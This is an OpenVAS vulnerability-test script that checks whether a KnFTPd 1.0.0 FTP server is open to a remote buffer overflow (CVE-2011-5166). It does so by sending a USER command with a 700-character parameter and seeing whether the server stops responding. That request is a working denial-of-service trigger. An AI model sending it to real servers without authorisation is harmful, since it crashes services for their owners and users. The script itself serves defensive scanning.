###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_knftpd_ftp_srv_mult_cmds_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary code
  on the system or cause the application to crash.
  Impact Level: System/Application";
tag_affected = "KnFTPd Server Version 1.0.0";
tag_insight = "The flaws are due to an error while processing the multiple commands,
  which can be exploited to cause a buffer overflow by sending a command with
  specially-crafted an overly long parameter.";
tag_solution = "No solution or patch is available as of 6th September, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/knftp";
tag_summary = "The host is running KnFTPd Server and is prone to multiple buffer
  overflow vulnerabilities.";

if(description)
{
  script_id(802034);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-5166");
  script_bugtraq_id(49427);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-07 08:36:57 +0200 (Wed, 07 Sep 2011)");
  script_name("KnFTPd FTP Server Multiple Commands Remote Buffer Overflow Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/519498");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/69557");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/104731");
  script_description(desc);
  script_summary("Determine if KnFTPd Server is prone to buffer overflow vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##
include("ftp_func.inc");

## Get the default FTP port
port = get_kb_item("Services/ftp");
if(!port){
  port = 21;
}

## Check FTP Port Status
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application with FTP banner
banner = get_ftp_banner(port:port);
if("220 FTP Server ready" >!< banner){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Confirm the application once again with the response
send(socket:soc, data:"OVTest");
resp =  recv(socket:soc, length:1024);
if("502 OVTest not found." >!< resp){
  exit(0);
}

## Send USER command with huge parameter
attack = string("USER ", crap(data: "A", length: 700), "\r\n");
send(socket:soc, data:attack);

## Close FTP socket
ftp_close(socket:soc);

## Sleep for 2 sec
sleep(2);

## Open TCP Socket
soc1 = open_sock_tcp(port);
if(!soc1) {
  security_hole(port:port);
  exit(0);
}

## Receive data from server
resp =  recv(socket:soc1, length:1024);

## Close FTP socket
ftp_close(socket:soc1);

## Confirm FTP Server is still alive and responding
if("220 FTP Server ready" >!< resp){
  security_hole(port:port);
  exit(0);
}
